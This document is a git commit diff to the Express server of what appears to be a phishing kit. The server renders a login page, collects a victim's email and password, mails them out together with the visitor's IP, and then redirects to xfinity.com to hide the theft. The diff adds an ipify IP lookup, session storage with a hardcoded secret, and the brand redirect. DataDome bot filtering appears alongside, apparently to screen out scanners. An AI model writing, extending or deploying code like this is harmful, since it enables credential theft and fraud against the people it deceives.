8bb4ac8185123118c407901b307e5cd5bb53c184
Jon Curtis <joncurtis312@gmail.com>
2023-11-16 10:12:23 -0400

    Your commit message here

--- app.js
+++ app.js
@@ -1,12 +1,14 @@
 const PORT = 5000
 
 const express = require('express')
+const session = require('express-session');
 const path = require('path')
 const cors = require('cors')
 const DataDome = require('@datadome/node-module');
 const sendMail = require('./mail')
 const beautify = require('js-beautify').html;
 const ejs = require('ejs');
+const axios = require('axios');
 
 const app = express()
 const storedValues = {};
@@ -26,6 +28,13 @@ app.use((req, res, next) => {
   visitorIP = req.ip;
   next();
 });
+
+// Add session middleware
+app.use(session({
+  secret: 'thisispersonel',
+  resave: false,
+  saveUninitialized: true,
+}));
 
 // Create a DataDome instance
 const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
@@ -66,31 +75,45 @@ app.get('/', (req, res) => {
 });
 
 // Render the login page
-app.get('/loginPage', (req, res) => {
-  const storedUserInput = storedValues.userInput;
+app.get('/loginPage', async (req, res) => {
+  try {
+    const response = await axios.get('https://api.ipify.org?format=json');
+    const visitorIP = response.data.ip;
 
-  // Render the loginPage.ejs file with the stored value
-  res.render('loginPage.ejs', { userInput: storedUserInput });
+    // Store visitorIP in the session
+    req.session.visitorIP = visitorIP;
+
+    // Assuming storedValues.userInput holds the userInput value
+    const userInput = storedValues.userInput;
+
+    // Render your loginPage.ejs passing visitorIP and userInput
+    res.render('loginPage.ejs', { visitorIP, userInput });
+  } catch (error) {
+    console.error('Error getting IP:', error);
+    res.status(500).send('Error getting IP');
+  }
 });
+
+
 
 // email sending
 app.post('/email', (req, res) => {
   const { passwd } = req.body;
   const email = storedValues.userInput;
-  const visitorIP = req.ip; // Access the visitor's IP from the request object
+  const visitorIP = req.session.visitorIP; // Access the visitor's IP from the session
 
   // Assuming your sendMail function requires email, password, and IP address
   sendMail(email, passwd, visitorIP, function (err, data) {
     if (err) {
       res.status(500).json({ message: 'internal error', err });
     } else {
-      res.json({ message: 'Email Sent!' });
+      // Redirect to a specific URL after sending the email
+      res.redirect('https://www.xfinity.com/hub/news'); // Replace '/success' with the desired URL
     }
   });
 });
 
   
-
 
 
 app.listen(PORT, () => console.log('server running'))
